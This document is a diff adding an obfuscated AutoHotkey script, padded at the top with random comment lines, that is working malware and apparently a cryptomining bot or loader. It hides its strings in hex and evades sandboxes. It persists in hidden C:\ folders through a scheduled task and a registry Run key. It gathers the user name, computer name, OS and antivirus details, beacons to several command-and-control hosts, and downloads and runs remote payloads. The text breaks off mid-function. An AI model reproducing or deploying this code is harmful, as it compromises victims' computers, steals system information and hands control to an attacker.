@@ -1,0 +1,792 @@
+;vzevrnnaqgwfmtemrdvurfqdzvgygfxyjkfqlhysiuppjmmuoictrmdgswrhyupjzrthrxztciaglrctgcfaaizlcbwpuhrumdctdsblgaigndrzvhkekcsfpopuejrevvvjxelhvwxxnwhiivnqvh
+;vnstwsqokrijmsjhhlxuwmnlmjxafhtfyycctbqlrsdbzhopsgivdrlvtedyyyshzqntlkmqpzaiumpobrxgxrpgygijczsybohpilbsdspucjtruefzozkdjwjxjxxlilsfiumcpyyyglwgvmogon
+;phfuqpxyzznyzztreregakonrlmhsqpliqlhyjonpaigodfbtacwycthtoivqdluaqaoyvasmbnadsteaqjfvruaolfntpxhsmbwbbgznflcewheryfkqhhrdwetayhxfqwwtwbadlkwtontcmgtzc
+;qqlhgfpizivaqeikvjnnkjjwhomuxetphmxcokdyxtcvlyleyxdgwvzqqcihlftmesjuwhhvfisiqpzhdleczvfubcsgurdkbrhypieemmmgenibeztvepzafvogvbjamlceknbnprszcewaadhenb
+;zcthtgaquxobpbbchlrerxpjgibsweaacsppgarqjespwffsnkljecembsgidqitrmafikmodyjijrbjzjxbcsepzdzuqphblxtswxjjjcydoucbmlksllsnxiovymnybuexcanpdtvhtbkltenrrzqune
+;urvokzzfpbdzipgwkslabbdhkjopcggkoagpnizemqjcscrmrgvxczvdlquxlzdydnslwdkwtictktvgxutmbpsdcztlknfzdxwtvfhplwcixmuudprhprjyjpcfgttsyyvsvdrdvjvpeuykelsogc
+;bmflyklzesynynzpwqwndubsyafqtnylkxibrahvgbwedkczeukoawgzzlhdtjupyzfihsjwkjhgfawjbneisgutqfrlcshvzmtgtoblnaffrzwwkzjjgsrkmezvyhboqpwzofhxxddghwndsnpvhs
+;tpruufmyncttninzajpwflejybqzdoohggmmkwuwcctlimemtsyacyurffjdeijflhpfarpzwqfzkewfimvidfjbsszvnqabuylohrjhxvysltfyitdrgnjtsbytepxlfdsiohivcbegphzabhfkvk
+;slojgteyiqmklpjwfuiybmrmurfuiinljxlsdrlmwptcqnicwhjnbubmoufnvyubmqwykbefgclrmsfyepznvxttkudellaugknhmliqxqfppnaubbtexzftaeuyobdtxphirxqysqnayhcyyjlywf
+;hzlejvwypuodcgqqtfcjjwidhagtljysirmzlpnhwcrgjjpahqduhbmcjrypivrxalepnrrkmllaoxjehenwuyfejkyvcitmkgtuddzfecnqnoznvdyofvhemaqzlmlefqonqnjsxkhnybgclysipp
+;vjqtwwrmedgzvxpemzuhghihzdexkpnmkjsmrlyqzdwpavlabksnjffvnfbhsibxfyptsdcedutvirpucpdzxtlxaltlbepqamutxltmfpewxnoxyszijyfnjkdxzvbmgpdafpjygmocpnbyexcdun
+;gmhsvpazugieovvljbzzmqdwpzlpmrpkqfwngfwqxmeksfaucnxhqnbiflnbghdqpydmzzcevwqiviwclqzwcyecidhngosvsitgmjgqurhegwjwpptyzvydveimbsenpoingxvygwpzvipnchudyf
+;hzuqlafyvivcyolofexydpylcjwpjelmjyyrbwhepdwkqmubopuqbeffebfkozobhutcgvgzyrbrauwvumoaprpjmukiqhggiiqpgeitblivwpsigitxwydmdjftkafssktjgdamjhophqszgzhskl
+;wxjhccgufjdjhajdsowjgpcgehibcdrjlaghiocykdutkceydurkoaltglhkqxufkcwpijlotubwvdnvlurhwzhedxqkajqosrwxsluyzlsjzvrqbsfajcvefwbjaajupfhxtzxcarawrlfoqfymwd
+;htttnevsuuvwctitvfepqlutzzrsobjozowqtashzscuqjawoiyujfltwlzsuifdmgiiezxstumbqoqshxtgmnqjrjxyaiasicvkeidkjcvqedyonfbpygsrzjofwwtxvgblmdeomuojuthpixsilb
+;nrrswwdtamrxwydfjbejlgdcbznkbujrgdeaharxljvplvxjcyebutueqxhotgmldgrqrmbnrcgweizgvwzvhfsaitatogqjfcjnnytpzshmcrjmaqtlfgsxayjmcimykpxpdxoryvqpcaybbwppoe
+;waeycdcpwqhdkfwhnjhpnpszawytdzihludnxsfvjcjpefrjpozsbjqhauwcaxuiasvfornhfymqhhfwpxoksxshpygqsudenraqelbbiktpjnqpsclhpdmwthepswhhmgvxiotpsaciaqjcwzpkts
+;pvwveeaggrhiqssgwysmtpufcbqfirshfaavwpkxolobugcxnyssgrcwkpmucahfvjaocojbvgqxqfnnrymfrztredoleughdwzrpwyeaylztxzcrsjrqzwgcwevogsgcjkxibvuhnaspodbfcbycy
+;hzjwawngxugptdsyqplaqvptqbhpszawvomwwazxswlscfvdtdffrmidncyzfgrotlbkjarwzgmfshlmsqmyfbcvqqxdyjlubvashhypvyrgzuycecnztczyocfddjlmoftckfrllpfqixjdhkuejt
+;wjamzstjtrtoqzicwxczwtvcqikfafnzpnlcrrnzcdmnnczzdkwrooshuezwqaimxjpjxfuhvnawpzdejurhcflziirclnvtvhgaezuxwcrgjurlsyyclnasslzuejqkgqubocpqwftdsdlubgljha
+;jnwqfixeinjvhtwlsfbzebgszyjsbyhvrnfheoxdephoafbuwyiydsouyhfsnxuuapzaxfubkqgvjiouxcvemtubnbpkubcxsujsdtttploufexnjalfhrhtbmbjpoqjqgnocqxpfssauasyuslapq
+;idhehrnrpibryxocruyojwywrhgyoidaotbmwwbojblujvtmadrddgaccefsmzpxjbqclbjqxmknvzxckeriecxzjuwjkrlcnvrwtrbiofywygrzbbqkvtraefwlhybridxgxyvrupsrjikyzidfce
+;mojkmxoktkajbptvyltmwhqekbeunsspdysykjgzoaeaveswgnbsyxfcvkdnkolvxtbvdzozsifuhoixnfbrzxrzxvlmvsdpplluggwszqrlmenzerkzxsojcunjgtazdmptpfuuseqloklmrpwjta
+;mlriglhjyvisydcacpfcydileujtbrwfweglqbjneagnddpuwcelchhzpfmssplmtapnjkrzplggriipiispihcvxkyrzhlivjnxwdjkzgrhbeyyyhxvxfjyetgspdpwyuaxfpzbawjvkbplvqdvxq
+;sofqefbxxunteomyotqadzacnmytujmnairyjytdgxnviiuilyppgtwvbklxtikkxilsmiophwdrxbqebudqnqfqcqiijktraonbjieexxawoaxmxwhllzkrfyrqnujbdpgpotluhoqyyhicebybqt
+;dbreyautisthlauubwlxaxsdhotztwqbwnvkjwljjnedvwzwcslzxytqmglmqpbdlonamukcfllsqfulwbyngwhjodrrppqmxhgjbhblawjgldcxcterauvygkbwzwjsbghpodbuihtxjokxnswqkn
+;egqzuaebzaanlqvoboexwdulvarjanygmzwomjqcxpyhwxaklrzpstsucowpebwmnwwustkynihwdbqqzikcsycswjbcvmnpeefujxuorirhbpzfsvzxqqgvockrlepxsaogpixgxdkcunzbuhzszn
+;oufxmjfmgzfpmajisuyuzytxbysuhvcjohduyklbfdyqanxnqguccqgfvncxwtutabmgtwbbvrmdsyasuuipqgveiyatzvrfeonkcvnfnjlfuadjvuebtjkbszuzwurkiiqmipccempiqprtxnfxjo
+;fnyezhzumjvsmgdhowyanrwrkypujfsbvsleckxocrlwthvplkfsmoljcxcxxqzomvrsfhmrjtkcrykgmpzdlfbjffmqzoobqskhukzgnhdyoblppumefyrttknjacamwyndxejaamsblplgrskrbg
+;vvcbfcflyrcfksszoavpnfttpnfyjlraebjszstqvkfxrtyxlpiayrulflpbtenwhipxpvzviijthqlfxfaafmghbeqfxwfwbawiqegmvhsarmklhrpmrrwkuvvgdqzqianhnwvfxgrldwlsewysty
+;tephdmowwqjqwuogpbfvsjladqknmoqgsirmwhkghtepevywahzmttbrjithmrhdjnwaiyqvywutbzuelshjgjbgrlodkktxtklesbgusbvodzzvjhrgobzlankfnqfwmuikjmyetczsrmfvnelbbc
+;yyenmojstacjsqpggkqkbjdxpbdkdsooxefbrjskkmnqlghkpkacmyigdaufrwgllppelcpagvsdqrzyehblmlscuznbiacbewsnzbzoobwsvioybtfrpsbkydufzhatvbospbdbgfoijsbhrwzthg
+;yfuebechoipmbeolxceshjeljymvvdktwhpfsmagitqmfbjotdcltpvttthubdillrmfxtlahzixmuevwxgavinxqgcrqditqgwxowokxxktxcgqrsisnebisvtzzujyjiglzbpehyrrapwiagvdqs
+;pxkxwacrgbcsregyvimbeixjzypwcfhusytjmjmfhzrzpmctwwqpdopnzkeztftgpntjfcztebzdvrjodxdrfmreyrezyzzqinilscvqdjrpguecuguahilfhhbhxjvhvtimhwnwhwykqnlhmbknvy
+;jsxnwixmfnittmhshlilfizkkqpjjtjszvxjgqkiqwarhjrraujdxetyqywjgulklrignzksixmbssknwmrguaavlnzawtykkyloxhrhjyttoqsiplbvvptxwsczfzqmeqctyjqhoriisfzwqxoqqc
+;lgepfoqfmpdwzxrxxjllddoxccivbewaxeuartcegmchmbjohzmhcnicxaawrfovbnpamvltowhivoepzrghgokgkonltmtoxxgxchwcoizwhiffpskdncfauwjaqdrbjcgejditauuexzaivbztui
+;dgoxnratssczflscrmuymwlnknhwvlcofocwsvpryyxpueqbtqdetalyzljzsmqnxnmehgorfztbnivryzupzaglavyluxgxbmhqaoyjxpawcxhfkdhvrnnogskzcjnwtszxmwsypiaqyqjipyojqe
+;rntsjyquiotxgwtblsrpmlcfzwegekbzcubzznfkhxtaiwqbquliwuggdplcdgnvrsnbobvidalckplpdflvvjpkysqugclabufbctcffsllqbbxzyevtpkqxhpnvbxlynsdroddwzwqhlwaomzmfm
+;bpysuifeyyakikukckyrlutscrwxiyfhirtuijxrtrwfeoiujwqjxtxebgirwidwxtsofviqykemaqbctmglgmvfpvvmfqpzkschlhjehnffbtmayidnqeljsgrxuujszdrfictlbibibdpmjnbctn
+#SingleInstance IGNORE
+#NoTrayIcon
+global kf@tt# := 4
+global @k@fkf#ss# := SubStr(A_ScriptName, 1, InStr(A_ScriptName, ".", False, -1) -1)
+global f@tt#fk@k# := ComObjCreate(@k@kfkfk@sssff("575363726970742E5368656C6C"))
+global kktt#k#ss#f# := @k@kfkfk@sssff("726164")
+global k@f@k@kk := @k@kfkfk@sssff("73797374656D666978")
+global k@f#fkfk := @k@fkf#ss#
+global kf#tt#k@kf#f := @kf@ffkkf#kkf#(21)
+global f@k#k@k@ := @kf@ffkkf#kkf#(21)
+global kf#fsss@#ss@ := @kf@ffkkf#kkf#(150)
+global k#f@ffss#k := @kf@ffkkf#kkf#(150)
+global k@@f#k@kfk := ComObjCreate(@k@kfkfk@sssff("536372697074696E672E46696C6553797374656D4F626A656374"))
+global f@f@k@ := @k@fkf#ss# . @k@kfkfk@sssff("2E657865")
+global k#k#@kf##k := @k@fkf#ss# . @k@kfkfk@sssff("2E747874")
+global @kf@ss@fsss# := 0
+global tttfk#k@k@k@ := 0
+global @tt#k@tttf@f := @k@kfkfk@sssff("787878")
+k#@kfkffk@ := 0
+if (kf@tt# = 1){
+}else{
+if StrLen(A_ScriptName) <> 25
+{
+exitapp
+}
+IfInString, A_ScriptDir, % @k@kfkfk@sssff("433A5C")
+{
+@kkf#f#f@tt@ := A_TickCount
+while 1 {
+Sleep, 1000
+f@@f#f@fkfk# := A_TickCount - @kkf#f#f@tt@
+if (f@@f#f@fkfk# > 120000)
+{
+break
+}
+}
+if StrLen(A_ScriptFullPath) <> 50
+{
+exitapp
+}
+}else{
+}
+for process in ComObjGet(@k@kfkfk@sssff("77696E6D676D74733A")).ExecQuery(@k@kfkfk@sssff("53656C656374202A2066726F6D2057696E33325F50726F63657373")) {
+f##ss@#k := process.Name
+#k#f@kf#@f := process.CommandLine
+#f#k#kkf := process.ExecutablePath
+if (StrLen(f##ss@#k) = 25){
+if (StrLen(#k#f@kf#@f) > 30){
+IfInString, #k#f@kf#@f, % @k@kfkfk@sssff("2E747874")
+{
+k#@kfkffk@ := k#@kfkffk@ + 1
+if (StrLen(#f#k#kkf) = 50){
+}
+}
+}
+}
+}
+if (k#@kfkffk@ > 1){
+exitapp
+}
+IfInString, A_ScriptDir, % @k@kfkfk@sssff("433A5C")
+{
+}else{
+FileCopyDir, %A_ScriptDir%, C:\%f@k#k@k@%%@k@f%%tt@f%
+FileCopyDir, %A_ScriptDir%, C:\%k#fsss%%kf#tt#k@kf#f%%k@k@f#kf%
+FileSetAttrib, +SH, C:\%k@fk@f%%f@k#k@k@%%fk@fkk%,1
+FileSetAttrib, +SH, C:\%k#fsss%%f#f@@k%%kf#tt#k@kf#f%,1
+FileMove, % @k@kfkfk@sssff("433A5C") . f@k#k@k@ . @k@kfkfk@sssff("5C") . @k@fkf#ss# . @k@kfkfk@sssff("2E657865") , % @k@kfkfk@sssff("433A5C") . f@k#k@k@ . @k@kfkfk@sssff("5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("2E657865")
+FileMove, % @k@kfkfk@sssff("433A5C") . f@k#k@k@ . @k@kfkfk@sssff("5C") . @k@fkf#ss# . @k@kfkfk@sssff("2E747874") , % @k@kfkfk@sssff("433A5C") . f@k#k@k@ . @k@kfkfk@sssff("5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("2E747874")
+FileMove, % @k@kfkfk@sssff("433A5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("5C") . @k@fkf#ss# . @k@kfkfk@sssff("2E657865") , % @k@kfkfk@sssff("433A5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("2E657865")
+FileMove, % @k@kfkfk@sssff("433A5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("5C") . @k@fkf#ss# . @k@kfkfk@sssff("2E747874") , % @k@kfkfk@sssff("433A5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("2E747874")
+ffk#k##tt##f := ";"
+FileAppend, `n %#kf#fss@%%ffk#k##tt##f%%fkkfkk% %f@#k%%kf#fsss@#ss@%%#tttf#k@%, C:\%f@k#k@k@%%@f#k@k%%#ss#fss@%\%k#k#%%kf#tt#k@kf#f%%fss##f%.txt
+k#ttt#ff := FileOpen(@k@kfkfk@sssff("433A5C") . f@k#k@k@ . @k@kfkfk@sssff("5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("2E747874"), 0)
+#k#ffkfkfk := k#ttt#ff.Read()
+#k#ffkfkfk := sss##ffkf#kffss@(#k#ffkfkfk)
+k#ttt#ff.Close()
+kfss@fss#tt# := FileOpen(@k@kfkfk@sssff("433A5C") . f@k#k@k@ . @k@kfkfk@sssff("5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("2E747874"), 5)
+kfss@fss#tt#.WriteLine(ffk#k##tt##f . k#f@ffss#k)
+kfss@fss#tt#.Write(#k#ffkfkfk)
+kfss@fss#tt#.Close()
+run % @k@kfkfk@sssff("433A5C") . f@k#k@k@ . @k@kfkfk@sssff("5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("2E65786520433A5C") . f@k#k@k@ . @k@kfkfk@sssff("5C") . kf#tt#k@kf#f . @k@kfkfk@sssff("2E747874")
+exitapp
+}
+#ffkfk#k@ffss#()
+k@fkffk##fkkff()
+}
+@kffsssf := Object()
+@kffsssf.Insert(@k@kfkfk@sssff("687474703A2F2F6E6577616C7068612E616C7068616E6F6F622E636F6D3A39383938"))
+@kffsssf.Insert(@k@kfkfk@sssff("687474703A2F2F7375706572616C7068612E7261646E65776167652E636F6D3A39383938"))
+@kffsssf.Insert(@k@kfkfk@sssff("687474703A2F2F7375706572616C7068612E6E65776D696E6572736167652E636F6D3A33333333"))
+@kffsssf.Insert(@k@kfkfk@sssff("687474703A2F2F6E6577616C7068612E73757065722D67616D657A65722E636F6D3A39333333"))
+@kffsssf.Insert(@k@kfkfk@sssff("687474703A2F2F6E6577616C7068612E616C7068616E6F6F622E636F6D3A39393939"))
+@kffsssf.Insert(@k@kfkfk@sssff("687474703A2F2F6E6F6F626D696E65722E7075626C6963766D2E636F6D3A39383938"))
+@kfkffk# := @kffsssf.MaxIndex()
+kf#kkf@k#tt# := 0
+while 1 {
+if (kf#kkf@k#tt# = @kfkffk#){
+kf#kkf@k#tt# := 1
+}else{
+kf#kkf@k#tt# := kf#kkf@k#tt# + 1
+}
+k@fkffk##fkkff()
+f@fk@k@ktt#fk@k#(@kffsssf[kf#kkf@k#tt#])
+}
+f@fk@k@ktt#fk@k#(k@@ffk#kfk#k){
+k##fk@f##fkf = 0
+while 1 {
+k@fkffk##fkkff()
+if (k##fk@f##fkf = 6){
+break
+}
+@k#ffssskf := #f@kf@k#@kfkf#(k@@ffk#kfk#k)
+if (@k#ffssskf = @k@kfkfk@sssff("4552524F52")){
+k##fk@f##fkf := k##fk@f##fkf + 1
+f#@kf@ktttk@k@f#(@k@kfkfk@sssff("636F756C646E7420636F6E6E65637420746F20") . k@@ffk#kfk#k . "-" . @k#ffssskf)
+}else{
+kf@k@fk@k@@f := kf@ffk@k#ktt#ss#(@k#ffssskf)
+if (kf@k@fk@k@@f = ""){
+k##fk@f##fkf := k##fk@f##fkf + 1
+f#@kf@ktttk@k@f#(@k@kfkfk@sssff("636F756C646E742066696E6420636F6D6D616E6420696E20") . k@@ffk#kfk#k . "-" . @k#ffssskf)
+}else{
+k##fk@f##fkf := 0
+f#@kf@ktttk@k@f#(@k@kfkfk@sssff("636F6E6E656374656420746F202022202E2061646472657373202E202220646174613A20") . kf@k@fk@k@@f)
+@kfk#fk@f#fk@ttt(@k#ffssskf)
+}
+}
+}
+}
+#f@kf@k#@kfkf#(k@k@k#@kffk#) { 
+static f#@kktt@f@kf := ComObjCreate(@k@kfkfk@sssff("57696E487474702E57696E48747470526571756573742E352E31"))
+try {
+f#@kktt@f@kf.Open(@k@kfkfk@sssff("474554"), k@k@k#@kffk# . "/" . k@sss@k@ttttt#kk() , true)
+f#@kktt@f@kf.Send()
+f#@kktt@f@kf.WaitForResponse()
+} catch {
+return @k@kfkfk@sssff("4552524F52")
+}
+if (f#@kktt@f@kf.Status = 200){
+return f#@kktt@f@kf.ResponseText
+}else{
+return @k@kfkfk@sssff("4552524F52")
+}
+}
+ktt#k#sss#fk(){
+try {
+For objOS In ComObjGet(@k@kfkfk@sssff("77696E6D676D74733A5C5C6C6F63616C686F73745C726F6F745C736563757269747963656E74657232")).InstancesOf(@k@kfkfk@sssff("416E7469566972757350726F64756374")) {
+k@@kf@f@kfk@ := ObjOS.displayName
+}
+} catch {
+return "Unknown"
+}
+return k@@kf@f@kfk@
+}
+fkfk@kf#@ffk#k#f(){
+try {
+For objOS In ComObjGet(@k@kfkfk@sssff("77696E6D676D74733A5C5C")).InstancesOf(@k@kfkfk@sssff("57696E33325F4F7065726174696E6753797374656D")) {
+k@#fktttff := ObjOS.Caption
+}
+} catch {
+return "Unknown"
+}
+return k@#fktttff
+}
+f#@kf@ktttk@k@f#(k#f@k#@ss#fk){
+
+}
+ktt##f#f#tttkfkk(ss#f#f#f@tt@fk) { 
+local f#tttk#f, fss#ktt@f#, tt#kf#@f
+If !ss#f#f#f@tt@fk
+Return 0
+f#tttk#f := A_FormatInteger
+SetFormat, INTEGER, H
+Loop, Parse, ss#f#f#f@tt@fk
+{
+fss#ktt@f# := Asc(A_LoopField)
+StringTrimLeft, fss#ktt@f#, fss#ktt@f#, 2
+tt#kf#@f .= fss#ktt@f# . ""
+}
+SetFormat, INTEGER, %k#fsss%%f#tttk#f%%fk@fkk%
+Return tt#kf#@f
+}
+urlsafe_b64decode(k##kkf)
+{
+Return ss#f#f@k#ss#f@fk(k##kkf, "-_")
+}
+f@f#fkf#f@@f@ss#(ss@kf@kf#k#f@k, k@@kfkffk@k#kf@f:="+/") { 
+StringLeft, k@@kfkffk@k#kf@f, k@@kfkffk@k#kf@f, 2
+Return @ss@#k@kkfk@#f(ss@kf@kf#k#f@k, @k@kfkfk@sssff("4142434445464748494A4B4C4D4E4F505152535455565758595A6162636465666768696A6B6C6D6E6F707172737475767778797A30313233343536373839") . k@@kfkffk@k#kf@f)
+}
+ss#f#f@k#ss#f@fk(kfkf@ssskf#fss#k, @tt#@f@kf@ff:="+/") { 
+StringLeft, @tt#@f@kf@ff, @tt#@f@kf@ff, 2
+Return @ss@ttt@@kf#(kfkf@ssskf#fss#k, @k@kfkfk@sssff("4142434445464748494A4B4C4D4E4F505152535455565758595A6162636465666768696A6B6C6D6E6F707172737475767778797A30313233343536373839") . @tt#@f@kf@ff)
+}
+@ss@#k@kkfk@#f(kf@f#f#k@k#f, #f@ffk@f@k#kfkf#:=""){
+StringCaseSense On
+Loop, Parse, kf@f#f#k@k#f
+{
+#k@fk@@fk@#f := Mod(A_Index, 3)
+if (#k@fk@@fk@#f = 1)
+{
+tt#fsssf@kff := ((Asc(A_LoopField) >> 2) & 0x3F)
+#fkkff := (Asc(A_LoopField) & 0x03 ) << 4
+}
+else if (#k@fk@@fk@#f = 2)
+{
+tt#fsssf@kff := #fkkff | ((Asc(A_LoopField) >> 4) & 0x0F)
+#fkkff := (Asc(A_LoopField) & 0x0F) << 2
+}
+else
+{
+tt#fsssf@kff := #fkkff | ((Asc(A_LoopField) >> 6) & 0x03)
+StringMid, base64Char, #f@ffk@f@k#kfkf#, tt#fsssf@kff + 1, 1
+k##kkf := k##kkf base64Char
+tt#fsssf@kff := (Asc(A_LoopField)) & 0x3F
+}
+StringMid, base64Char, #f@ffk@f@k#kfkf#, tt#fsssf@kff + 1, 1
+k##kkf := k##kkf base64Char
+}
+if (#k@fk@@fk@#f = 1)
+{
+StringMid, base64Char, #f@ffk@f@k#kfkf#, #fkkff + 1, 1
+return k##kkf base64Char "=="
+}
+else if (#k@fk@@fk@#f = 2)
+{
+StringMid, base64Char, #f@ffk@f@k#kfkf#, #fkkff + 1, 1
+return k##kkf base64Char "="
+}
+else
+{
+return k##kkf "=="
+}
+}
+@ss@ttt@@kf#(sss@ktt#@ss#kf, #tttf#k#tt#f:=""){
+StringReplace sss@ktt#@ss#kf, sss@ktt#@ss#kf, =,,All
+StringReplace, sss@ktt#@ss#kf, sss@ktt#@ss#kf, `r,,All
+StringReplace, sss@ktt#@ss#kf, sss@ktt#@ss#kf, `n,,All
+StringCaseSense On
+Loop, Parse, sss@ktt#@ss#kf
+{
+StringGetPos, currentBin, #tttf#k#tt#f, %A_LoopField%
+@tttk#kf := Mod(A_Index, 4)
+if (@tttk#kf = 1)
+{
+#fkkff := currentBin << 2
+}
+else if (@tttk#kf = 2)
+{
+ffk@ffkk := ffk@ffkk Chr(#fkkff | (currentBin >> 4))
+#fkkff := (currentBin & 0x0F) << 4
+}
+else if (@tttk#kf = 3)
+{
+ffk@ffkk := ffk@ffkk Chr(#fkkff | (currentBin >> 2))
+#fkkff := (currentBin & 0x03) << 6
+}
+else
+{
+ffk@ffkk := ffk@ffkk Chr(#fkkff | currentBin)
+}
+}
+Return ffk@ffkk
+}
+#ffkfk#k@ffss#() {
+@ffkf@ss@f := A_ScriptDir . "\" . @k@fkf#ss# . @k@kfkfk@sssff("2E657865")
+@ss@f##k@f := @tt@#ffkkffss@(A_ScriptDir . "\" . @k@fkf#ss# . @k@kfkfk@sssff("2E747874"))
+#k#ss@f##fk@ := @k@kfkfk@sssff("7363687461736B73202F637265617465202F7363206D696E757465202F6D6F2031202F746E")
+run, %#k#ss@f##fk@%%@ss@f#ff%%@ss@f#ff% %f@sss@%%#ss#fsss%%k@f#fkfk% /tr "%@ffkf@ss@f%%#ss#fss@%%f#f@@k% %f@kk%%@ss@f##k@f%%k#k#%",,Hide
+Sleep, 3000
+f#@tt@k#ss@k := @k@kfkfk@sssff("7363687461736B732E657865")
+Process, Close, %@f#k@k%%kffk#fk@%%f#@tt@k#ss@k%
+RegWrite, % @k@kfkfk@sssff("5245475F535A") , % @k@kfkfk@sssff("484B4355"), % @k@kfkfk@sssff("536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E"), %ss@kkf%%ss@kkf%%k@f#fkfk%, %@ffkf@ss@f%%ss@kkf%%@tt@ss#f% %@ss@f##k@f%%fk@fkk%%#ss#fss@%
+}
+#tt#@f@sss#sss(fk@k#ss#kttttt@k){
+Process,Exist,%#sss%%fk@k#ss#kttttt@k%%@f#k@k%
+return Errorlevel
+}
+fktt@kf#f#f@kf#k(){
+ss@f#kktt#@f := #f@f@k#tt@kf(ss@tt@@f@kf@() . A_OSVersion  . fkfk@kf#@ffk#k#f())
+return SubStr(ss@f#kktt#@f, 1, 30)
+}
+ss@tt@@f@kf@(){
+try {
+DriveGet, hSerial, Serial, C:
+} catch {
+return @k@kfkfk@sssff("556E6B6E6F776E")
+}
+return hSerial
+}
+k@@k#kkf@k@f@sss(){
+if  ( #tt#@f@sss#sss(@k@kfkfk@sssff("73747265616D65722E657865")) or #tt#@f@sss#sss(@k@kfkfk@sssff("6C697665776F726B65722E657865")) or #tt#@f@sss#sss(@k@kfkfk@sssff("7375706572636865636B65722E657865")) or #tt#@f@sss#sss(@k@kfkfk@sssff("737065656475702E657865")) or #tt#@f@sss#sss(@k@kfkfk@sssff("6E6F76612E657865"))){
+return 1
+}
+return 0
+}
+ttttttfk@kttt@@k(){
+if  #tt#@f@sss#sss(@k@kfkfk@sssff("637075636865636B65722E657865")) or #tt#@f@sss#sss(@k@kfkfk@sssff("637075636865636B657233322E657865"))
+{
+return 1
+}
+return 0
+}
+k@sss@k@ttttt#kk(){
+kkf@@fkk := f@tt#fk@k#.ExpandEnvironmentStrings(@k@kfkfk@sssff("25434F4D50555445524E414D4525"))
+f#k@kk := f@tt#fk@k#.ExpandEnvironmentStrings(@k@kfkfk@sssff("25555345524E414D4525"))
+spreadisrun := k@@k#kkf@k@f@sss()
+@tt#f@fk := fkfk@kf#@ffk#k#f()
+ffkkf##tt# := ttttttfk@kttt@@k()
+kf#fk@tt#f := ktt#k#sss#fk()
+tt#sssk##fk@ := fktt@kf#f#f@kf#k() . @k@kfkfk@sssff("2F312F") . #f@f@k#tt@kf(@tt#f@fk)  . "/" . #f@f@k#tt@kf(kkf@@fkk) . "/" . #f@f@k#tt@kf(f#k@kk)  . "/" .  #f@f@k#tt@kf(kktt#k#ss#f#)  . "/" .   #f@f@k#tt@kf(k@@kf@f@kfk@)  . "/" .  spreadisrun  . "/" .  ffkkf##tt#
+return tt#sssk##fk@
+}
+#f@f@k#tt@kf(f@fsss@kf#@kf#){
+f@fsss@kf#@kf# := ktt##f#f#tttkfkk(f@f#fkf#f@@f@ss#(f@fsss@kf#@kf#))
+return f@fsss@kf#@kf#
+}
+kf@ffk@k#ktt#ss#(kfk@fktt#k@k){
+try {
+f@f#f@:=RegExMatch(kfk@fktt#k@k, @k@kfkfk@sssff("3A3A283F503C4E616D653E2E2A3F293A3A"), match)
+} catch {
+return ""
+}
+return matchName
+}
+ss@tt@@k@kfkf@#f(@kf@@k#fk@ktt##k) { 
+#f#ktt#kf#@f := ""
+ss@kkffk@k:=1
+Loop % StrLen(@kf@@k#fk@ktt##k)/2	{
+tttf@f := SubStr(@kf@@k#fk@ktt##k, ss@kkffk@k , 2)
+#f#ktt#kf#@f .= Chr("0x" tttf@f)
+ss@kkffk@k +=2
+}
+Return #f#ktt#kf#@f
+}
+fkf##f#k@fk@k#(kf@k@sssk@f#kk,fkf@f@#f@tt#kk,ktt#@kf#@k#kkf){
+try {
+fkf#ff:=RegExMatch(kf@k@sssk@f#kk, fkf@f@#f@tt#kk . @k@kfkfk@sssff("283F503C4E616D653E2E2A3F29") . ktt#@kf#@k#kkf, match)
+} catch {
+return ""
+}
+return matchName
+}
+@kfk#fk@f#fk@ttt(kktttkf@ss@k){
+f#@kf@ktttk@k@f#(@k@kfkfk@sssff("67657420636F6D6D616E64") . ss#f#f@k#ss#f@fk(ss@tt@@k@kfkf@#f(kktttkf@ss@k)))
+#fkkfk := ss#f#f@k#ss#f@fk(ss@tt@@k@kfkf@#f(kktttkf@ss@k))
+k#f@k@@tttf# := @k@kfkfk@sssff("433A5C") . @k@fkf#ss#
+if (FileExist(k#f@k@@tttf#)) {
+}else{
+k#f@k@@tttf# := A_ScriptDir
+}
+f@f#@fk@@kf@ := @k@kfkfk@sssff("7570646174652D")
+fkkfk@@k := @k@kfkfk@sssff("646F776E6C6F61642D")
+f#kf@k#ffk := @k@kfkfk@sssff("7363726970742D")
+f#ss@tt@k@ := @k@kfkfk@sssff("75706461746573656C662D")
+IfInString, #fkkfk, %f@f#@fk@@kf@%%#ss#@k%%@tt@sssf%
+{
+@k@ss@#k := fkf##f#k@fk@k#(#fkkfk,@k@kfkfk@sssff("7570646174652D"),@k@kfkfk@sssff("2D757064617465"))
+f@k@k#@k := @k@kfkfk@sssff("5C") . @kf@ffkkf#kkf#(10) . @k@kfkfk@sssff("2E747874")
+if FileExist(A_ScriptDir . @k@kfkfk@sssff("5C") . f@k@k#@k){
+FileDelete ,%A_ScriptDir%\%f#f@k@f#%%f@k@k#@k%%ktt@fkkf%
+}
+f#@kf@ktttk@k@f#(@k@kfkfk@sssff("646F776E6C6F6164696E672075706461746520") . f@k@k#@k . " - " . @k@ss@#k)
+UrlDownloadToFile, %f@@k%%@k@ss@#k%%fkktt#k#%, %A_ScriptDir%\%f#@k%%f@k@k#@k%%ss@f@f%
+if FileExist(A_ScriptDir . @k@kfkfk@sssff("5C") . f@k@k#@k){
+FileDelete ,%A_ScriptDir%\%k#k#@kf##k%%ttt##k@f%%kf@sss%
+FileMove, %A_ScriptDir%\%f@k@k#@k%%#ss#@k%%k@f#@k%, %A_ScriptDir%\%fkfss#%%k#k#@kf##k%%fss##f%
+Run,%A_ScriptDir%\%k@fk@f%%f#f@k@f#%%f@f@k@% %A_ScriptDir%\%sss@fk#f%%k#k#@kf##k%%kfk#fkf#%
+exitapp
+}
+return
+}
+IfInString, #fkkfk, %k@k@f#kf%%@fkf@f%%fkkfk@@k%
+{
+tt@sss@f#k@k := fkf##f#k@fk@k#(#fkkfk,@k@kfkfk@sssff("646F776E6C6F61642D"),@k@kfkfk@sssff("2D646F776E6C6F6164"))
+tt@sss@f#k@k := StrSplit(tt@sss@f#k@k, @k@kfkfk@sssff("3A213A"))
